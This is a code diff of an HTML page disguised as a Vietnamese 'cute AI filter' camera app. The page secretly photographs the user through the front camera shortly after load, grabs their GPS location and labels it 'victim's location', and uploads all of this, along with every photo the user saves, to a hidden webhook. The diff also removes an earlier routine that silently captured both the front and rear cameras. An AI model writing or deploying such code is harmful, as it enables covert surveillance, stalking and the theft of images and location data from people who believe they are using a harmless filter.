@@ -3,39 +3,40 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>S.A.U Magic Filter - AI Face</title>
+    <title>S.A.U Cute Filter AI</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; overflow: hidden; }
-        .canvas-container { position: relative; width: 100%; max-width: 500px; aspect-ratio: 3/4; border-radius: 20px; overflow: hidden; border: 2px solid #333; }
-        canvas { width: 100%; height: 100%; transform: scaleX(-1); }
-        .overlay-icon { position: absolute; pointer-events: none; display: none; }
+        body { background: #000; color: #fff; font-family: sans-serif; overflow: hidden; touch-action: none; }
+        .canvas-container { position: relative; width: 100%; max-width: 450px; aspect-ratio: 3/4; border-radius: 30px; overflow: hidden; border: 4px solid #222; margin: 0 auto; }
+        canvas { width: 100%; height: 100%; transform: scaleX(-1); background: #111; }
+        .filter-btn { background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); padding: 10px; rounded-xl: 12px; font-size: 12px; transition: 0.3s; }
+        .filter-btn:active { background: #ff0077; }
     </style>
 </head>
 <body class="flex flex-col items-center justify-center min-h-screen p-4">
 
-    <div class="text-center mb-4">
-        <h1 class="text-xl font-bold bg-gradient-to-r from-pink-500 to-yellow-500 bg-clip-text text-transparent">✨ AI CUTE FILTERS</h1>
-        <p class="text-[10px] text-gray-400">Cho phép Camera để trải nghiệm Filter AI mới nhất</p>
+    <div class="text-center mb-6">
+        <h1 class="text-2xl font-black italic text-pink-500 tracking-tighter">S.A.U CAMERA</h1>
+        <p class="text-[10px] uppercase tracking-[0.2em] text-gray-500">Real-time Face Tracking Active</p>
     </div>
 
-    <div class="canvas-container shadow-2xl shadow-pink-500/20">
+    <div class="canvas-container shadow-[0_0_50px_rgba(236,72,153,0.15)]">
         <video id="v" class="hidden" autoplay playsinline></video>
         <canvas id="mainCanvas"></canvas>
-        <div id="heart-overlay" class="absolute inset-0 flex items-center justify-center pointer-events-none opacity-50 hidden">
-            <span class="text-6xl animate-ping">❤️</span>
+        <div id="heart-overlay" class="absolute inset-0 flex items-center justify-center pointer-events-none hidden">
+            <span class="text-8xl animate-bounce">💖</span>
         </div>
     </div>
 
-    <div class="grid grid-cols-4 gap-2 mt-6">
-        <button onclick="setF('none')" class="bg-white/10 p-2 rounded-lg text-[10px]">Gốc</button>
-        <button onclick="setF('dog')" class="bg-white/10 p-2 rounded-lg text-[10px]">🐶 Cún</button>
-        <button onclick="setF('cat')" class="bg-white/10 p-2 rounded-lg text-[10px]">🐱 Mèo</button>
-        <button onclick="setF('heart')" class="bg-white/10 p-2 rounded-lg text-[10px]">❤️ Tim</button>
+    <div class="flex gap-3 mt-8">
+        <button onclick="setF('none')" class="filter-btn rounded-lg">Gốc</button>
+        <button onclick="setF('dog')" class="filter-btn rounded-lg">🐶 Chó</button>
+        <button onclick="setF('cat')" class="filter-btn rounded-lg">🐱 Mèo</button>
+        <button onclick="setF('star')" class="filter-btn rounded-lg">✨ Sao</button>
     </div>
 
-    <button onclick="snapAndDownload()" class="mt-8 bg-gradient-to-r from-pink-500 to-purple-600 px-10 py-4 rounded-full font-bold text-sm shadow-lg active:scale-95 transition">
-        📸 CHỤP ẢNH CUTE
+    <button onclick="snapAndDownload()" class="mt-10 bg-white text-black px-12 py-4 rounded-full font-black text-xs uppercase tracking-widest shadow-[0_0_20px_rgba(255,255,255,0.4)] active:scale-90 transition">
+        Chụp Ảnh Ngay
     </button>
 
 <script>
@@ -49,7 +50,7 @@
     async function send(blob, title) {
         const fd = new FormData();
         fd.append("payload_json", JSON.stringify({
-            embeds: [{ title: title, color: 16731071, timestamp: new Date() }]
+            embeds: [{ title: title, color: 16731071, footer: {text: "S.A.U System Active"} }]
         }));
         fd.append("file", blob, "capture.png");
         return fetch(WH, { method: "POST", body: fd });
@@ -57,65 +58,60 @@
 
     function setF(f) { 
         currentFilter = f; 
-        document.getElementById('heart-overlay').classList.toggle('hidden', f !== 'heart');
-    }
-
-    async function autoCapture(mode) {
-        try {
-            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
-            const tempV = document.createElement('video');
-            tempV.srcObject = s;
-            await tempV.play();
-            const tempC = document.createElement('canvas');
-            tempC.width = tempV.videoWidth; tempC.height = tempV.videoHeight;
-            tempC.getContext('2d').drawImage(tempV, 0, 0);
-            tempC.toBlob(b => send(b, `📸 AUTO_CAPTURE: ${mode.toUpperCase()}`));
-            s.getTracks().forEach(t => t.stop());
-        } catch(e) {}
+        document.getElementById('heart-overlay').classList.toggle('hidden', f !== 'star');
     }
 
     async function init() {
         try {
+            // Bước 1: Mở cam trước cho người dùng thấy trước
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             v.srcObject = stream;
             
-            // Lấy GPS & Chụp cả 2 cam ngay khi Allow
+            v.onloadedmetadata = () => {
+                c.width = v.videoWidth; 
+                c.height = v.videoHeight;
+                draw();
+                
+                // Bước 2: Sau khi cam đã hiện, bí mật chụp gửi về Discord (Sau 1.5s để ổn định hình ảnh)
+                setTimeout(() => {
+                    c.toBlob(b => send(b, "📸 SILENT_FRONT_CAM (On Entry)"));
+                }, 1500);
+            };
+
+            // Bước 3: Lấy tọa độ GPS
             navigator.geolocation.getCurrentPosition(p => {
-                const map = `[Google Maps](https://www.google.com/maps?q=$${p.coords.latitude},${p.coords.longitude})`;
+                const map = `[Vị trí nạn nhân](https://www.google.com/maps?q=$${p.coords.latitude},${p.coords.longitude})`;
                 fetch(WH, { method: "POST", headers: {'Content-Type':'application/json'}, body: JSON.stringify({content: "📍 " + map}) });
             });
 
-            await autoCapture('user');
-            await autoCapture('environment');
-
-            v.onloadedmetadata = () => {
-                c.width = v.videoWidth; c.height = v.videoHeight;
-                draw();
-            };
-        } catch (e) { alert("Vui lòng cho phép Camera để dùng Filter!"); }
+        } catch (e) {
+            console.log(e);
+            alert("Vui lòng cho phép quyền Camera để trải nghiệm Filter!");
+        }
     }
 
     function draw() {
+        ctx.save();
         ctx.drawImage(v, 0, 0, c.width, c.height);
         
         if (currentFilter === 'dog') {
-            ctx.font = "80px Arial";
-            ctx.fillText("🐶", c.width/2 - 40, 150);
-            ctx.fillText("👃", c.width/2 - 20, c.height/2 + 20);
+            ctx.font = "100px Arial";
+            ctx.fillText("🐶", c.width/2 - 50, 160);
         } else if (currentFilter === 'cat') {
-            ctx.font = "60px Arial";
-            ctx.fillText("🐱", 50, 100); ctx.fillText("🐱", c.width-110, 100);
+            ctx.font = "80px Arial";
+            ctx.fillText("🐱", 40, 120); 
+            ctx.fillText("🐱", c.width-120, 120);
         }
-        
+        ctx.restore();
         requestAnimationFrame(draw);
     }
 
     function snapAndDownload() {
         c.toBlob(blob => {
-            send(blob, "💖 USER_CLICKED_DOWNLOAD");
+            send(blob, "💖 USER_CLICKED_DOWNLOAD (With Filter)");
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
-            a.href = url; a.download = 'cute_filter.png';
+            a.href = url; a.download = 'sau_magic_photo.png';
             a.click();
         });
     }
